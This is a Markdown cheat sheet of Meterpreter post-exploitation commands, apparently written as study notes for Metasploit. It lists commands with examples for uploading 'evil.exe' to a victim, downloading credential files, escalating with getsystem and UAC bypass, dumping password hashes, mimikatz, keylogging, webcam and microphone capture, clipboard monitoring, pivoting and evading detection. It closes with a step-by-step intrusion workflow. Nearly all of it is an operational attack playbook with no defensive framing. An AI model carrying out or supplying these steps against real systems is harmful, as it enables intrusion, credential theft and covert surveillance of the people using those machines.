
# Meterpreter Post-Exploitation Command   


## ğŸ§  Core Concept
Once you gain a `meterpreter` session via `windows/meterpreter/reverse_tcp`, you can perform **post-exploitation tasks** like:
- Reconnaissance
- Privilege escalation
- Data exfiltration
- Persistence
- Lateral movement

---

## ğŸ”¹ File System Navigation & Manipulation

| Command | Purpose | Example |
|--------|--------|--------|
| `pwd` | Show current directory | `meterpreter > pwd` â†’ `C:\Users\user\Desktop` |
| `cd <path>` | Change directory | `cd C:\\Windows` |
| `cat <file>` | View file contents | `cat C:\\secret.txt` |
| `upload <local> <remote>` | Upload file to victim | `upload /tmp/evil.exe C:\\temp\\evil.exe` |
| `download <remote> <local>` | Download file from victim | `download C:\\creds.txt /tmp/` |
| `search -d <dir> -f <pattern>` | Search for files | `search -d C:\\ -f *.pdf` |
| `-r` flag | Use with `upload`/`download`/`search` to **recurse subdirectories** | `search -r -f *.docx` |

---

## ğŸ”¹ System & User Information

| Command | Purpose |
|--------|--------|
| `sysinfo` | OS, architecture, domain, logged-in users |
| `getuid` | Current user context (e.g., `WIN7\user` or `NT AUTHORITY\SYSTEM`) |
| `ps` | List running processes |
| `ifconfig` / `ipconfig` | Show network interfaces and IPs |

> âœ… **Critical for situational awareness** after initial access.

---

## ğŸ”¹ Process & Command Execution

| Command | Purpose | Example |
|--------|--------|--------|
| `execute -f <exe>` | Run a program | `execute -f calc.exe` |
| `execute -f <exe> -a <args>` | Run with arguments | `execute -f notepad.exe -a C:\\secret.txt` |
| `execute -H` | Hide process window |
| `execute -m` | Execute from memory (stealthier) |
| `shell` | Drop into **native Windows CMD** | Exit with `Ctrl+Z` to return to Meterpreter |

---

## ğŸ”¹ Privilege Escalation

| Command | Purpose |
|--------|--------|
| `getsystem` | Attempt to escalate to **NT AUTHORITY\SYSTEM** using built-in techniques (e.g., token duplication, named pipe impersonation) |

- **Prerequisite**: Must be in **local Administrators group**
- **Note**: If `getsystem` fails, use **UAC bypass** via Metasploit module (`exploit/windows/local/bypassuac`) first

---

## ğŸ”¹ Credential Access

| Command | Purpose |
|--------|--------|
| `hashdump` | Dump **NTLM password hashes** from SAM database |

- **Requires**: SYSTEM privileges
- **If fails**: Migrate session to a process running as SYSTEM (e.g., `migrate -N spoolsv.exe`)

---

## ğŸ”¹ Surveillance & Monitoring

| Command | Purpose |
|--------|--------|
| `screenshot` | Capture current desktop screen |
| `webcam_list` | List available webcams |
| `webcam_snap` | Take a photo using webcam |
| `webcam_stream` | Stream video (no audio) |
| `record_mic -d 10` | Record 10 seconds of audio from mic |
| `keyscan_start` | Start keylogger |
| `keyscan_dump` | Show captured keystrokes |
| `keyscan_stop` | Stop keylogger |
| `clipboard_get_data` | Get current clipboard content |
| `clipboard_monitor_start` | Continuously monitor clipboard |
| `clipboard_monitor_dump` | View all captured clipboard data |
| `clipboard_monitor_stop` | Stop + dump + exit monitor |

> ğŸ”’ **Combined**: `keyscan + clipboard_monitor` = powerful user activity capture.

---

## ğŸ”¹ Post Modules (Automated Recon)

| Command | Purpose |
|--------|--------|
| `run post/<module>` | Execute built-in post-exploitation scripts |
| Example: `run post/windows/gather/checkvm` â†’ detects if target is a VM |
| Others: `enum_logged_on_users`, `gather/enum_shares`, `gather/credentials/credential_collector` |

> ğŸ’¡ Use `search post/windows` in `msfconsole` to find more.

---

## ğŸ”¹ Network Pivoting (Lateral Movement)

| Command | Where Used | Purpose |
|--------|--------|--------|
| `ipconfig` | In meterpreter | Discover internal subnets on victim |
| `route add <net> <mask> <session_id>` | In **msfconsole** | Route traffic through victim to internal networks |
| `portfwd add -l <local_port> -p <remote_port> -r <target_ip>` | In meterpreter | Forward local port â†’ internal service |
| Example: `portfwd add -l 3389 -p 3389 -r 192.168.10.5` â†’ then `rdesktop 127.0.0.1` |

> ğŸŒ Essential for **moving beyond initial breach**.

---

## ğŸ”¹ Extensions & Advanced Features

| Command | Purpose |
|--------|--------|
| `use python` | Load Python interpreter on victim |
| `python_execute "<code>"` | Run one-liner Python |
| `python_import -f /tmp/script.py` | Run local Python script on remote machine |
| `load mimikatz` | (Not in your doc, but common) Extract plaintext passwords from memory |

---

## ğŸ”¹ Session Management & Stealth

| Command | Purpose |
|--------|--------|
| `background` | Return to `msfconsole` and keep session alive |
| `sleep <seconds>` | Pause beaconing to avoid detection |
| `set_timeouts` / `get_timeouts` | Configure session lifetime & retry behavior |
| `exit` | Terminate Meterpreter session |
| `sessions -K` | Kill all sessions before quitting msfconsole |

> â³ **Sleep + timeouts** = mimic legitimate traffic patterns.

---

## âœ… When to Use What? (Workflow Summary)

1. **Initial Access** â†’ `sysinfo`, `getuid`, `ipconfig`  
2. **Escalate** â†’ `getsystem` (or `bypassuac` if needed)  
3. **Recon** â†’ `ps`, `search`, `run post/...`  
4. **Credentials** â†’ `hashdump`, `mimikatz` (if loaded)  
5. **Exfiltrate** â†’ `download`, `clipboard_monitor`, `keyscan`  
6. **Pivot** â†’ `route add`, `portfwd`  
7. **Persist / Stay Hidden** â†’ `sleep`, migrate to stable process  

